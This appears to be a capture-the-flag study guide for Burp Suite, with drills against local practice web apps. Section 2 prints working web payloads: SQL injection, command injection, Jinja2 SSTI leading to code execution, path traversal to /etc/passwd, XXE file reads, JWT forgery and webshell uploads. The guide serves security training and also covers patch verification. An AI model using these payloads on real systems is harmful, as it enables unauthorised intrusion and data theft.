# Burp Suite — Detailed A/D Guide (with hands-on drills)

> Burp is a **web proxy**: it sits between your browser and the target and lets you **see and
> edit every HTTP request/response by hand**. It's for **web services only** (not pwn/crypto).
> You install it yourself on the pwnbox (it's not pre-loaded). This guide walks every tool and
> every attack with concrete steps against the practice targets in `practice/` so you can drill
> now — **remember no AI on the day, so build the muscle memory.**

---

## 0. One-time setup (practice this until it's automatic)

1. **Launch Burp** (Community edition is fine). Choose *Temporary project* → *Use Burp defaults*.
2. **Point Firefox at Burp:** Firefox → Settings → Network Settings → *Manual proxy* →
   HTTP Proxy `127.0.0.1` Port `8080`, tick *Also use this proxy for HTTPS*.
   (Or use the **FoxyProxy** add-on to toggle quickly.)
3. **Install Burp's CA cert** (so HTTPS targets don't error):
   - With the proxy on, browse to `http://burp` → *CA Certificate* → download `cacert.der`.
   - Firefox → Settings → Privacy & Security → Certificates → View Certificates → Import →
     select it → tick *Trust this CA to identify websites*.
4. **Test it:** browse to your practice target, then look in **Proxy → HTTP history** — you
   should see the requests. If yes, you're wired up.

> **Tip:** turn **Proxy → Intercept → "Intercept is off"** for normal browsing, and flip it **on**
> only when you want to catch and edit a specific request. Constant intercept is annoying.

---

## 1. The tools — what each does and when to reach for it

| Tool | Reach for it when… | Key action |
|------|--------------------|-----------|
| **Proxy → Intercept** | you want to edit *one* request mid-flight | catch it, edit, *Forward* |
| **Proxy → HTTP history** | you want to see everything that's been sent | right-click → *Send to Repeater* |
| **Repeater** | you're tuning a payload (send, tweak, send again) | edit request, *Send*, read response |
| **Decoder** | you have base64/URL/hex/JWT to read or build | paste → *Decode as* / *Encode as* |
| **Comparer** | two responses differ subtly (blind SQLi, auth) | load both → *Words/Bytes* diff |
| **Sequencer** | you suspect weak/predictable tokens | capture tokens → *Analyze* |
| **Intruder** | you want to auto-iterate a payload list | ⚠️ practice/own box only (§5) |
| **Extensions (BApp)** | you need JWT/other helpers | *Extensions* → BApp Store → **JWT Editor** |

**Core loop you'll use 90% of the time:** browse the feature in Firefox → find the request in
**HTTP history** → right-click **Send to Repeater** → edit the vulnerable parameter → **Send** →
read the response for the flag. Repeat, tweaking the payload, until it pops.

---

## 2. ATTACKS — worked, step by step (using your practice targets)

Start a target first, e.g.:
```bash
cd practice/targets && python3 vuln_web_pack.py     # port 5001
# and in another drill: python3 vuln_web.py          # port 5000 (SQLi)
```
Browse through Burp to `http://127.0.0.1:5001/...` so the requests land in HTTP history, then
Send to Repeater and try the payloads below. **URL-encode special chars** when needed
(select the text in Repeater → Ctrl+U, or Burp does it on *Send* for the URL).

### 2.1 SQL injection  (target `vuln_web.py` → `/item?id=1`)
- In Repeater, change `id=1` to:
  `0' UNION SELECT flag, 2 FROM flags-- -`
- Column-count first if unsure: `1' ORDER BY 1-- -`, `ORDER BY 2`, `ORDER BY 3` (error = count+1).
- Blind variant to practice Comparer: `1' AND 1=1-- -` vs `1' AND 1=2-- -` → diff the responses.
- **search:** `sql injection UNION cheat sheet`

### 2.2 Command injection  (`/ping?host=`)
- Set `host` to: `127.0.0.1; cat cmdi_flag.txt`
- Try other separators if `;` is filtered: `127.0.0.1| cat cmdi_flag.txt`, `$(cat cmdi_flag.txt)`.
- **search:** `os command injection payloads`

### 2.3 SSTI  (`/render?name=`)
- Detect: `name={{7*7}}` → response shows `49` (injection confirmed).
- Escalate (this target): `name={{open('ssti_flag.txt').read()}}`
- Real-Jinja2 style (know it): `{{cycler.__init__.__globals__.os.popen('cat flag').read()}}`
- **search:** `SSTI jinja2 payload RCE`

### 2.4 Path traversal / LFI  (`/file?name=`)
- `name=../lfi_flag.txt`, climb further `name=../../../../etc/passwd` to prove traversal.
- Bypasses: `....//`, URL-encode `..%2f`, absolute path `/flag.txt`.
- **search:** `path traversal payloads`

### 2.5 IDOR / access control  (`/profile?id=`)
- Walk the id: `id=1`, `id=2`, `id=3`… the flag sits in another user's record (admin=2).
- Use **Intruder** *(own box only)* to iterate ids 1–100 automatically.
- **search:** `IDOR broken access control`

### 2.6 Auth bypass / cookie tampering
- In **Proxy**, intercept a logged-in request; edit the cookie (`role=user`→`role=admin`,
  `uid=1`→`uid=2`), or remove a signature param, and Forward.
- Decode the cookie first in **Decoder** (base64) to understand its structure.
- **search:** `cookie tampering privilege escalation`

### 2.7 JWT attacks  (Extensions → JWT Editor)
- Load a request with an `eyJ...` token. In the **JWT** tab:
  - `alg:none` — strip the signature, change claims (`admin:true`).
  - Weak secret — export the token, crack with `hashcat`/`jwt_tool`, re-sign.
  - RS256→HS256 confusion — re-sign with the public key as HMAC secret.
- **search:** `jwt editor burp alg none`, `jwt_tool`

### 2.8 SSRF  (any "fetch a URL" feature)
- Point the URL param at `http://127.0.0.1:<internal>/` or `file:///flag.txt`.
- Bypass filters: `http://127.1`, `http://0x7f000001`, `http://localhost.`
- **search:** `SSRF filter bypass cheat sheet`

### 2.9 XXE  (XML/SVG/DOCX upload or XML body)
- Inject: `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///flag.txt">]><root>&e;</root>`
- **search:** `XXE read file payload`

### 2.10 Insecure deserialization
- Spot a serialized blob (base64 cookie/param). Decode in **Decoder** to identify the format
  (pickle/PHP/Java), craft a malicious object, re-encode, send.
- **search:** `php object injection`, `python pickle rce`

### 2.11 File upload → webshell
- Intercept the upload; change filename `shell.jpg`→`shell.php`, or content-type, or add a
  double extension `shell.php.jpg`. Then browse to the uploaded path.
- **search:** `file upload bypass webshell`

### Helper-tool attacks
- **Decoder** — base64/URL/hex/JWT encode & decode, build payloads.
- **Comparer** — boolean-blind SQLi (true vs false page), detect auth differences.
- **Sequencer** — capture a few hundred session tokens → *Analyze* → see if they're predictable.

---

## 3. DEFENSE — using Burp to protect your box (and your SLA)

Burp isn't a shield, but it's how you **prove a patch works without breaking the checker**:

1. **Reproduce the attack** — put the exploit request in Repeater, *Send*, confirm the flag leaks.
2. **Patch the source** (parameterise the query, confine the path, remove the backdoor, etc.).
3. **Re-send the exploit request** → the flag must now be **gone / request rejected**. Defense ✅.
4. **Re-send the *normal* happy-path request** (the thing a real user/the checker does) → it must
   **still return the correct result**. This is the SLA check — if it still works, the checker
   stays green. **Keep both requests in two Repeater tabs and re-run after every patch.**
5. **Study incoming attacks** — browse **HTTP history** of your own traffic to see how you're
   being hit, and patch that exact endpoint first.
6. **Audit your own tokens** — run **Sequencer** on your session cookies; if they're predictable,
   harden them (without changing what the checker expects).

> Burp pairs with the **capture→replay** move: `tcpdump` grabs the enemy's exploit on the wire,
> you paste the raw request into Repeater to confirm it, then both **patch it** and **weaponize it
> back** at everyone.

---

## 4. The Burp → runner handoff (how Burp fits your scoring loop)

Burp can't steal a fresh flag from every team every tick (no looping, no dedupe, no auto-submit,
and auto-firing it at enemies breaks the rules). So:

```
Burp Repeater  ──find & tune the exploit by hand──▶  copy the working request
        │
        ▼
exploit(ip) -> flag   (your Python function, parameterised by IP)
        │
        ▼
runner.py  ──loops all enemy IPs every tick, ≥2s delay, dedupes, submits──▶ points
```

**Convert a Burp request to Python fast:** Burp shows the exact method, path, params, headers,
and body — mirror them in `requests.get(...)` / `requests.post(...)`. (Burp Pro has
*Copy as curl*; in Community, read the request panel and translate by hand.)

---

## 5. ⚠️ Rules — what you must NOT do in Burp

Your competition bans **scanning/enumeration/probing of other teams** and **DoS** (≥2s delay):

- ❌ **Burp active Scanner** against enemy boxes — automated probing → **banned**.
- ❌ **Intruder** brute/fuzz/content-discovery against enemies — probing + flooding → **banned**.
- ❌ Pointing any fast automated Burp feature at other teams.
- ✅ **Proxy / Repeater / Decoder / Comparer / Sequencer** on your own / given / practice targets — fine.
- ✅ **Intruder** only on your own/practice box (e.g. the IDOR id walk above).
- ✅ The looped attack on enemies runs from **`runner.py` with the ≥2s delay**, never Burp.

---

## 6. Burp practice checklist (do before the event)
- [ ] Proxy + CA cert configured in Firefox; requests appear in HTTP history.
- [ ] Caught a request with Intercept, edited a param, Forwarded it.
- [ ] Pulled each practice flag (SQLi, cmdi, SSTI, LFI, IDOR) via **Repeater**.
- [ ] Used **Decoder** to base64-decode and re-encode a value.
- [ ] Used **Comparer** on a true/false blind-SQLi pair.
- [ ] Installed the **JWT Editor** extension and forged an `alg:none` token.
- [ ] Ran the **patch → re-send exploit (fails) → re-send happy-path (works)** defense loop once.
- [ ] Converted one Repeater request into a Python `exploit(ip)->flag`.
```
